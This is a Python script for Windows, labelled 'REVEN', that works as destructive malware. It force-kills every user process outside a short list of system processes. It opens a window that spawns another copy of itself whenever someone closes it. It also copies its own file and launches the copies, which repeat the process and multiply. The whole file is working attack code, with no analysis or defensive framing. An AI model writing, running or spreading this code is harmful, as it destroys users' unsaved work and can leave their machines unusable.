import subprocess
import tkinter as tk
import threading
import random
import os
import sys

excluded_processes = {
    "explorer.exe", "svchost.exe", "wininit.exe", "winlogon.exe",
    "csrss.exe", "lsass.exe", "services.exe", "smss.exe",
    "taskhostw.exe", "dwm.exe", "spoolsv.exe", "system",
    "system idle process", "cmd.exe", "python.exe", "pythonw.exe",
    "conhost.exe", "sihost.exe", "fontdrvhost.exe", "runtimebroker.exe",
    "searchui.exe", "shellexperiencehost.exe"
}

def kill_user_apps():
    result = subprocess.run('tasklist /FI "STATUS eq running" /FO CSV', shell=True, capture_output=True, text=True)
    lines = result.stdout.strip().split('\n')

    for line in lines[1:]:
        parts = line.split('","')
        if len(parts) < 1:
            continue
        process_name = parts[0].replace('"','')

        if process_name.lower() in (name.lower() for name in excluded_processes):
            continue

        subprocess.run(f'taskkill /F /IM {process_name}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def create_window():
    win = tk.Tk()
    win.title("REVEN")
    win.configure(bg="#0F380F")
    win.geometry(f"300x100+{random.randint(0, 1200)}+{random.randint(0, 700)}")

    label = tk.Label(
        win,
        text="REVEN",
        fg="#A8FF60",
        bg="#0F380F",
        font=("Courier", 40, "bold")
    )
    label.pack(expand=True)

    def on_close():
        threading.Thread(target=create_window).start()
        win.destroy()

    win.protocol("WM_DELETE_WINDOW", on_close)
    win.mainloop()

def start_cmd():
    os.system('color 0A')
    print("\n" * 3)
    print(" " * 30 + "REVEN")
    print("\n" * 2)

def self_replicate():
    try:
        import shutil
        import time
        import pathlib

        current_file = pathlib.Path(__file__).resolve()
        for i in range(3):
            copy_name = current_file.parent / f"reven_copy_{i}.py"
            shutil.copy2(current_file, copy_name)
            subprocess.Popen(['python', str(copy_name)], shell=True)
            time.sleep(0.5)
    except Exception:
        pass

if __name__ == "__main__":
    start_cmd()
    kill_user_apps()
    threading.Thread(target=create_window).start()
    threading.Thread(target=self_replicate).start()
